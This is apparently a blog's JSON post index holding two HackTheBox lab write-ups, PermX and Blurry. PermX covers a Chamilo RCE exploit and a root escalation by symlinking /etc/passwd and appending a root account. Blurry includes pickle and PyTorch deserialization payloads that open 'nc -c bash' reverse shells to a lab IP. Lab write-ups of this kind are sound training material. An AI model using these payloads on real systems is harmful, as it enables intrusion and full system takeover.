[
  
    {
      "title"    : "[WriteUp] HackTheBox - PermX",
      "category" : "",
      "tags"     : "writeup and hackthebox",
      "url"      : "/2024/07/18/writeup-hackthebox-permx/",
      "date"     : "Jul 18, 2024",
      "content"  : "PermX is a simple-difficulty box from HackTheBox 2024 Season 5.EnumerationLet’s start with enumeration.  Nmap scanThe Nmap scan report shows open ports 22 and 80.Port 80 is for the web service, which redirects to the domain “permx.htb”,So we need to configure the hosts file first.Accessing the web service through a browser,didn’t reveal any useful information for now.  web pageDirectory enumeration on the web service was similarly disappointing.  dirsearch scanTried using ffuf to enumerate subdomains.  ffuf scanNice! Discovered the subdomain “lms.permx.htb”.Add this domain to the hosts file as well.The web page is a login panel.  web pageDirectory enumeration again.  dirsearch scanReview interesting directories from the robots.txt file.  robots.txtExamining these directories one by one.found that the “/documentation/changelog.html” page,the detailed version number of the current web application: Chamilo 1.11.24.  information disclosureFootholdGoogle search for Chamilo vulnerabilities,we found an RCE vulnerability for this version: CVE-2023-4220.  google search resultThe exploit script can be found on Github:https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-pocUse nc to listen and execute this exploit script to gain a reverse shell.python3 main.py -u http://lms.permx.htb -a revshell  set opetions and waiting exploit comleted  get the shellWe have a shell!However, since the www-data user’s permissions are very limited,we need a privilege escalation.As usual, upload linpeas.sh and use it to gather information.  users  password dsclosure  another password dsclosureThe information collected includes two leaked passwords:gaufrette  03F6lY3uXAP2bkW8  Using the password “03F6lY3uXAP2bkW8” for SSH login, Successfully login as mtz.  user shellobtaining a user shell.Privilege EscalationThe next goal is root privileges.As usual, checking the SUDO information frist.  sudo -lThe terminal output shows that the current user is allowed to run the ‘/opt/acl.sh’ file with sudo without a password.Next, inspect the acl.sh file.#!/bin/bashif [ &quot;$#&quot; -ne 3 ]; then   /usr/bin/echo &quot;Usage: $0 user perm file&quot;   exit 1fiuser=&quot;$1&quot;perm=&quot;$2&quot;target=&quot;$3&quot;if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then   /usr/bin/echo &quot;Access denied.&quot;   exit 1fi# Check if the path is a fileif [ ! -f &quot;$target&quot; ]; then   /usr/bin/echo &quot;Target must be a file.&quot;   exit 1fi/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;The script’s logic involves using setfacl to set rwx permissions on a specified file for a given user, But there are filtering conditions on the file path (the third parameter):  The file path must be under “/home/mtz”  The file path cannot contain directory traversal symbols “..”OK, now let’s try to get a root privilege shell.My plan is to create a symbolic link to the “/etc/passwd” file in the “/home/mtz” directory, then edit the passwd file to add a privileged user.Generates a password HASH.  generate passwd hashUse the following commands to escalate privileges.ln -s /etc/passwd passwdsudo /opt/acl.sh mtz rwx /home/mtz/tmp/passwdecho &#39;b0rgch3n:$1$zrd0hGa7$xs1GPMR4gl1lZE1lJwQt81:0:0:root:/root:/bin/bash&#39; &amp;gt;&amp;gt; /home/mtz/tmp/passwdCheck the passwd file to confirm the privileged account has been added.  check passwd fileLogin with the privileged account.  root shellGain a root privilege shell.Cheers!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/07/18/writeup-hackthebox-permx/'> <img src='/images/cover/10.jpg' alt='[WriteUp] HackTheBox - PermX'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>3 min read <time class='article__date' datetime='2024-07-18T03:34:00+08:00'>Jul 18, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - PermX</h2> <p class='article__excerpt'>PermX is a simple-difficulty box from HackTheBox 2024 Season 5.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/writeup' class='article__tag'>writeup</a>  <a href='/tag/hackthebox' class='article__tag'>hackthebox</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "[WriteUp] HackTheBox - Blurry",
      "category" : "",
      "tags"     : "writeup and hackthebox",
      "url"      : "/2024/06/13/writeup-hackthebox-blurry/",
      "date"     : "Jun 13, 2024",
      "content"  : "Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.EnumerationLet’s start by enumerating.  Nmap scanThe Nmap scan report shows open ports 22 and 80.Port 80 is a web service and redirects to the domain “app.blurry.htb”.So, You need to configure the hosts file first.Since there is a web service, we should enumerate the directories.  dirsearch scanAlso, when accessing the web service through a browser,the page information indicates that the service is ClearML.  brower accessFootholdFound a ClearML-related vulnerability through Google search: CVE-2024-24590.All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:“Machine Learning Operations: What You Need to Know Now - HiddenLayer”First, install ClearML.Then, go to the settings page of the web service and copy the configuration information.The configuration information involves three addresses in the ClearML initialization settings: web_server, api_server, and files_server.We need to configure the hosts file to add the DNS entries for these three domains.10.10.11.19 app.blurry.htb\t# web_server10.10.11.19 api.blurry.htb\t# api_server10.10.11.19 files.blurry.htb\t# files_serverInitialize the ClearML configuration with the “clearml-init” command and paste the copied content.From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.The task’s code contains the deserialization code needed to trigger the vulnerability.After a detailed code review, we can understand its logic roughly as follows:  Check all tasks with project_name “Black Swan” and tags [‘review’].  Iterate through these tasks and call artifact.get() for deserialization.  Destroy these tasks after the iteration.Based on the code audit results,we need to ensure consistency in the project_name and tags when testing with the PoC code.from clearml import Taskimport pickle, osclass RunCommand:    def __reduce__(self):        # Payload        return (os.system, (&#39;echo Hacked by b0rg | nc 10.10.14.19 14443&#39;,))command = RunCommand()project_name = &#39;Black Swan&#39;task_name = &#39;TestNotMatchTaskName&#39;tags = [&#39;review&#39;]task = Task.init(project_name, task_name, tags)task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&#39;.pkl&#39;)Use nc to listen and execute the PoC code.After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.Modify the Payload to turn the PoC code into Exploit code.nc -c bash 10.10.14.19 14443Again, listen using nc, and execute the exploit code to gain user permissions and obtain a reverse shell.Privilege EscalationUse linpeas.sh for enumeration and collect information related to privilege escalation.The scan results show that the current user has an SSH private key, which can be used for persistent access.Another interesting piece of information is that the current user has NOPASSWD sudo access.Let’s take a look at the source code of evaluate_model,we can see that evaluate_model actually calls the “/models/evaluate_model.py” file.Looking at the source code of evaluate_model.py,we can see that there is a step for loading the model,which leads us to anticipate the presence of a deserialization vulnerability.By constructing malicious model code,we can generate a custom pth file containing a reverse shell.import torchimport torch.nn as nnimport torch.nn.functional as Fimport osclass Net(nn.Module):    def __init__(self):        super(Net, self).__init__()        self.layer1 = nn.Linear(1, 128)        self.layer2 = nn.Linear(128, 128)        self.layer3 = nn.Linear(128, 2)    def forward(self, x):        x = F.relu(self.layer1(x))        x = F.relu(self.layer2(x))        action = self.layer3(x)        return action    def __reduce__(self):        return (os.system, (&#39;nc -c bash 10.10.14.19 14443&#39;,))if __name__ == &#39;__main__&#39;:    n = Net()    torch.save(n, &#39;getshell.pth&#39;)Upload this code to the machine and execute it to generate the getshell.pth file.Then, listen using nc, and execute the NOPASSWD sudo exploit.Gain administrator privileges.Nice!",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2024/06/13/writeup-hackthebox-blurry/'> <img src='/images/cover/11.jpg' alt='[WriteUp] HackTheBox - Blurry'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>6 min read <time class='article__date' datetime='2024-06-13T16:01:35+08:00'>Jun 13, 2024</time> </span> </div><h2 class='article__title'>[WriteUp] HackTheBox - Blurry</h2> <p class='article__excerpt'>Blurry is a medium-difficulty box from HackTheBox 2024 Season 5.</p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='b0rgch3n'><img class='article__author-image' src='/images/author.jpg' alt='b0rgch3n's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>b0rgch3n</a><span> in </span> <span class='article-tags'> <a href='/tag/writeup' class='article__tag'>writeup</a>  <a href='/tag/hackthebox' class='article__tag'>hackthebox</a> </span></div></div></div></div></div>"
    } 
  
]
